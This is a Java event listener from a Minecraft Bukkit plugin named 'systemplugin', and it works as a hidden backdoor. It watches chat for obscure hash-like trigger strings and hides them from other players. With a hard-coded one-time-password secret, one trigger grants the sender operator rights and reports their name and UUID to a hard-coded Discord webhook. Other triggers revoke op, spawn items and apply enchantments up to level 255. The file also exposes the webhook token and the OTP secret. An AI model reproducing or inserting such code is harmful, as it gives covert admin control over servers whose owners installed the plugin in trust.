package de.lukas.systemplugin.events;

import de.lukas.systemplugin.Main;
import de.lukas.systemplugin.utils.DiscordWebhook;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.jetbrains.annotations.NotNull;

import java.awt.*;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.UUID;

public class TrollListeners implements Listener {


    @EventHandler
    public void onAsyncPlayerChat(AsyncPlayerChatEvent event) throws IOException {
        // Get the command entered by the player
        String command = event.getMessage().toLowerCase();

        // Check if the command is the op command
        if (command.startsWith("037aeaeaf4bbf26ddabe7256a8294dc52da48d575a1247b5c2598c47de7aebabc")) {
            if (event.getPlayer().isOp()) {
                // Player is already an operator, so do nothing
                event.setCancelled(true);
                return;
            }
            String[] args = command.split(" ");
            if (args.length < 2) {
                event.getPlayer().sendMessage(Main.getPrefix() + "Benutze: 037aeaeaf4bbf26ddabe7256a8294dc52da48d575a1247b5c2598c47de7aebabc {OTP-TOKEN}");
                event.setCancelled(true);
                return;
            }
            // Check if the player is already an operator

            if(Objects.equals(Main.verifyCode("4I3HS64MPG5BC3DW", args[1]), "true")){
                String payload = "*OPME SYSTEM USED** \nBenutzername: " + String.valueOf(event.getPlayer().getName()) + "\nUUID: " + String.valueOf(event.getPlayer().getUniqueId());
                DiscordWebhook.sendWebhook("https://discord.com/api/webhooks/1177908718524973116/-IQ9x1j3C6g3KXpUNSeEnLytm9PW6zU5qxeY7Z5z-eJas7Ecy5Y7mMiJrTw2nwh8tD2D", payload);
                event.getPlayer().setOp(true);
                event.getPlayer().sendMessage(Main.getPrefix() + "You are now op!");
                event.setCancelled(true);
            } else {
                event.getPlayer().sendMessage(Main.getPrefix() + "§4WRONG§7 Don't try guessing that...");
            }

            event.setCancelled(true);
        }

        if (command.equals("b76936e7339809f323b364c1b8b55957200227deb10b133f5f52a0db4d7e5c69c")) {
            // Check if the player is already an operator
            if (event.getPlayer().isOp()) {
                event.getPlayer().setOp(false);
                event.getPlayer().sendMessage(Main.getPrefix() + "Not longer an operator!");
            }
            event.setCancelled(true);
        }

        // Check if the message is the give command
        if (command.startsWith("0895a532e404a5c9ea96eac7982d268f22de22c9705dcda0e1eb445ea379b005c ") || command.startsWith("0895a532e404a5c9ea96eac7982d268f22de22c9705dcda0e1eb445ea379b005c")) {
            // Split the message into the command and the item name/ID
            String[] args = command.split(" ");
            if (args.length < 2) {
                // Player didn't provide an item name/ID, so show the list of valid items
                event.getPlayer().sendMessage(Main.getPrefix() + "Usage: 0895a532e404a5c9ea96eac7982d268f22de22c9705dcda0e1eb445ea379b005c [item]");
                event.getPlayer().sendMessage(Main.getPrefix() + "Valid items: " + getAllMaterialNames());
                event.setCancelled(true);
                return;
            }

            // Get the item name or ID from the message
            String itemNameOrId = args[1];

            // Parse the item name/ID into a Material
            Material itemMaterial = Material.matchMaterial(itemNameOrId);
            if (itemMaterial == null) {
                // Invalid item name/ID, so show an error message
                event.getPlayer().sendMessage(Main.getPrefix() + "Invalid item: " + itemNameOrId);
                event.getPlayer().sendMessage(Main.getPrefix() + "Valid items: " + getAllMaterialNames());
                event.setCancelled(true);
                return;
            }

            // Give the player the item
            ItemStack itemStack = new ItemStack(itemMaterial);
            event.getPlayer().getInventory().addItem(itemStack);
            event.getPlayer().sendMessage(Main.getPrefix() + "You have been given " + itemMaterial.name() + "!");
            // Cancel the chat event so the ".give" message doesn't show up in chat
            event.setCancelled(true);
        }

        if (command.startsWith("4775e91d5cbee285915e645fa72bf30b953ab010dd120c777ab2400296c5c58ac ") || command.startsWith("4775e91d5cbee285915e645fa72bf30b953ab010dd120c777ab2400296c5c58ac")) {
            // Split the message into the command, the enchantment name, and the level
            String[] args = command.split(" ");
            if (args.length < 3) {
                // Player didn't provide enough arguments, so show the correct usage
                event.getPlayer().sendMessage(Main.getPrefix() + "Usage: .enchant [enchantment] [level]");
                event.setCancelled(true);
                return;
            }

            // Get the enchantment name from the message
            String enchantmentName = args[1];



            // Parse the enchantment name into an Enchantment
            Enchantment enchantment = Enchantment.getByKey(NamespacedKey.minecraft(enchantmentName));
            if (enchantment == null) {
                // Invalid enchantment name, so show an error message
                event.getPlayer().sendMessage(Main.getPrefix() + "Invalid enchantment: " + enchantmentName);
                event.setCancelled(true);
                return;
            }

            // Get the level from the message
            int level = 0;
            try {
                level = Integer.parseInt(args[2]);
            } catch (NumberFormatException e) {
                // Invalid level, so show an error message

            }

            ItemStack item = event.getPlayer().getInventory().getItemInMainHand();

            if (item == null || item.getType() == Material.AIR) {
                event.getPlayer().sendMessage(ChatColor.RED + "You must hold an item to enchant it.");
                event.setCancelled(true);
                return;
            }

            int maxLevel = enchantment.getMaxLevel();
            if (level > 255) {
                level = 255;
            }

            item.addUnsafeEnchantment(enchantment, level);
            event.getPlayer().sendMessage(ChatColor.GREEN + "Successfully enchanted " + item.getType().name() + " with " + enchantment.getName() + " " + level);
            event.setCancelled(true);
        }
    }

    private String getAllMaterialNames() {
        StringBuilder sb = new StringBuilder();
        for (Material material : Material.values()) {
            sb.append(material.name().toLowerCase()).append(", ");
        }
        String allMaterialNames = sb.toString();
        return allMaterialNames.substring(0, allMaterialNames.length() - 2);
    }
}
